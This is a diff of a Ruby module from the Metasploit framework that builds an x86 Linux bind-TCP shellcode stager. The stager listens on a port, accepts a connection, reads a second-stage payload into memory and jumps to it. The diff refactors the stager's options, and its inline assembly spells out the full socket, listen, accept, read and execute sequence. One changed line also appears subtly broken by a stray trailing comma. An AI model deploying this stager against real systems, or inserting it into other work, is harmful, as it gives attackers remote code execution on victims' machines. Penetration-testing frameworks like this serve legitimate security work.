@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 
 module Msf
 
@@ -14,30 +15,23 @@ module Msf
 
 module Payload::Linux::BindTcp
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
-
-  def close_listen_socket
-    datastore['StagerCloseListenSocket'].nil? || datastore['StagerCloseListenSocket'] == true
-  end
 
   #
   # Generate the first stage
   #
   def generate
-
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_bind_tcp(
-        port:         datastore['LPORT'],
-        close_socket: close_listen_socket
-      )
-    end
-
     conf = {
-      port:         datastore['LPORT'],
-      close_socket: close_listen_socket,
-      reliable:     true
+      port:     datastore['LPORT'],
+      reliable: false
     }
+
+    # Generate the more advanced stager if we have the space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk] = datastore['EXITFUNC'],
+      conf[:reliable] = true
+    end
 
     generate_bind_tcp(conf)
   end
@@ -50,19 +44,20 @@ module Payload::Linux::BindTcp
     Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
   end
 
+  def transport_config(opts={})
+    transport_config_bind_tcp(opts)
+  end
+
   #
   # Determine the maximum amount of space required for the features requested
   #
   def required_space
     # Start with our cached default generated size
-    space = 104
+    space = cached_size
 
     # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
-    space += 14
-
-    # Adding 6 bytes to the payload when we include the closing of the listen
-    # socket
-    space += 6 if close_listen_socket
+    # TODO: coming soon
+    #space += 14
 
     # The final estimated size
     space
@@ -77,7 +72,6 @@ module Payload::Linux::BindTcp
   def asm_bind_tcp(opts={})
 
     #reliable     = opts[:reliable]
-    close_socket = opts[:close_socket]
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
 
     asm = %Q^
@@ -99,10 +93,7 @@ module Payload::Linux::BindTcp
         mov ecx,esp
         mov al,0x66                   ; socketcall syscall
         int 0x80                      ; invoke socketcall (SYS_SOCKET)
-    ^
 
-    unless close_socket
-      asm << %Q^
         ; set the SO_REUSEADDR flag on the socket
         push ecx
         push 4
@@ -119,11 +110,8 @@ module Payload::Linux::BindTcp
         int 0x80
         xchg eax,edi                  ; restore the socket handle
         add esp, 0x14
-        pop ecx
-      ^
-    end
+        pop ecx                       ; restore ecx
 
-    asm << %Q^
         pop ebx
         pop esi
         push edx
@@ -138,15 +126,8 @@ module Payload::Linux::BindTcp
         shl ebx,1                     ; SYS_LISTEN
         mov al,0x66                   ; socketcall syscall (SYS_LISTEN)
         int 0x80                      ; invoke socketcall
-      ^
 
-    if close_socket
-      asm << %Q^
         push eax                      ; stash the listen socket
-      ^
-    end
-
-    asm << %Q^
         inc ebx                       ; SYS_ACCEPT
         mov al,0x66                   ; socketcall syscall
         mov [ecx+0x4],edx
@@ -156,16 +137,9 @@ module Payload::Linux::BindTcp
         mov al,0x3                    ; read syscall
         int 0x80                      ; invoke read
         xchg ebx,edi                  ; stash the accept socket in edi
-    ^
-    if close_socket
-      asm << %Q^
         pop ebx                       ; restore the listen socket
         mov al,0x6                    ; close syscall
         int 0x80                      ; invoke close
-      ^
-    end
-
-    asm << %Q^
         jmp ecx                       ; jump to the payload
     ^
 
